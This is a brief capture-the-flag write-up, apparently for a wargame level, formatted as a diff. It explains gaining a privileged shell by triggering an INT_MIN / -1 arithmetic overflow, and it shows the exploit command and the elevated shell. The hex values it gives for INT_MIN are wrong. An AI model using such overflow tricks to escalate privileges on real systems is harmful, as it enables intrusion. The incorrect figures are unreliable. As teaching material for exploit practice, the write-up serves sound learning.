@@ -1,0 +1,8 @@
+Nice interesting one, code requires you to cause an arithmetic overflow in order for a hook function to execute (which gives you shell). First thoughts are to create a divide by zero, but the code guards against this rather well. The alternative approach is to flip the sign of INT_MIN (ffffffffff) by multiplying by -1. The quotient (or positive identical value) is not possibly to represent as a 32-bit int (efffffffff + 1), as it would be identical to the negative value!
+
+level2@io:/levels$ ./level02 -2147483648 -1
+source code is available in level02.c
+
+WIN!
+sh-4.1$ id
+uid=1003(level3) gid=1002(level2) groups=1003(level3),1002(level2),1029(nosu)
